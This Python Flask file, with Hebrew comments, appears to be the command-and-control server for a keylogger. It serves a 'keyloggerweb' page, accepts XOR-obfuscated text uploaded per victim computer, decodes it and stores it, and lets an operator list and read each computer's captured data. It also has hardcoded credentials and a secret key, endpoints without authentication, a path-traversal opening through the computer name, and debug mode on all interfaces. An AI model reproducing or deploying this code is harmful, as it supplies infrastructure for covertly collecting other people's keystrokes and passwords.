from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import os

app = Flask(__name__)
app.secret_key = "super_secret_key"  # שנה למפתח מאובטח יותר

# נתוני משתמשים לדוגמה
USERS = {"admin": "1234", "user": "password"}

# רשימת מחשבים
computers = ["computer1", "computer2", "computer3", "computer4"]

# תיקיית קבצים לשמירת נתונים
FILE_DIRECTORY = "files"
os.makedirs(FILE_DIRECTORY, exist_ok=True)  # יוצר את התיקייה אם אינה קיימת

# ---- ניתוב לדפים ----

@app.route("/")
def home():
    return render_template("keyloggerweb.html")  # דף ראשי

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        data = request.json
        username = data.get("username")
        password = data.get("password")

        if username in USERS and USERS[username] == password:
            session["user"] = username
            return jsonify({"success": True})
        return jsonify({"success": False}), 401

    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("home"))

@app.route("/computer_management")
def computer_management():
    if "user" not in session:
        return redirect(url_for("login"))
    return render_template("computer_management.html")

# ---- ניהול רשימת מחשבים ----

@app.route("/get_computers")
def get_computers():
    return jsonify({"computers": computers})

@app.route("/add_computer", methods=["POST"])
def add_computer():
    data = request.json
    computer_name = data.get("name")

    if computer_name and computer_name not in computers:
        computers.append(computer_name)
        return jsonify({"success": True})
    return jsonify({"success": False}), 400

@app.route("/remove_computer", methods=["POST"])
def remove_computer():
    data = request.json
    computer_name = data.get("name")

    if computer_name in computers:
        computers.remove(computer_name)
        return jsonify({"success": True})
    return jsonify({"success": False}), 400

# ---- פונקציות הצפנה/פענוח ----

def bytewise_xor(text, key=5):
    return ''.join(chr(ord(char) ^ key) for char in text)

# ---- נתיב להעלאת נתונים מוצפנים ----

@app.route('/upload', methods=['POST'])
def upload_data():
    data = request.json
    if not data or 'encrypted_text' not in data or 'computer_name' not in data:
        return jsonify({'error': 'Missing data'}), 400

    computer_name = data['computer_name']
    encrypted_text = data['encrypted_text']

    # פענוח הטקסט
    decrypted_text = bytewise_xor(encrypted_text)

    # שמירת הטקסט המפוענח
    file_path = os.path.join(FILE_DIRECTORY, f"{computer_name}.txt")
    with open(file_path, 'a', encoding='utf-8') as file:
        file.write(decrypted_text + '\n')

    return jsonify({'message': 'Data received and saved'}), 200

# ---- שליפת נתונים לפי מחשב ----

@app.route('/get_data/<computer_name>', methods=['GET'])
def get_data(computer_name):
    file_path = os.path.join(FILE_DIRECTORY, f"{computer_name}.txt")
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            data = file.read()
        return jsonify({'computer_name': computer_name, 'data': data}), 200
    return jsonify({'error': 'File not found'}), 404

# ---- שליפת רשימת קבצים ----

@app.route("/get_files")
def get_files():
    try:
        files = os.listdir(FILE_DIRECTORY)
        return jsonify({"files": files})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ---- הרצת Flask ----

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
